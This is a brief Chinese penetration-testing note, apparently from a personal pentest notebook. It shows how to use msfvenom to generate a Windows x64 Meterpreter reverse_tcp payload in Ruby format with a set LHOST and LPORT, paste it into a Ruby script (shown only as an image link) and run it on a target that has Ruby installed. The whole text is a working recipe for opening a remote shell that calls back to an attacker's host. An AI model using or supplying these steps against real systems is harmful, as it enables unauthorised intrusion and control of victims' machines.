	目标机器装有ruby时
	生成
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby
	粘贴到ruby中
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/96.png)

	执行
	>ruby xx.ruby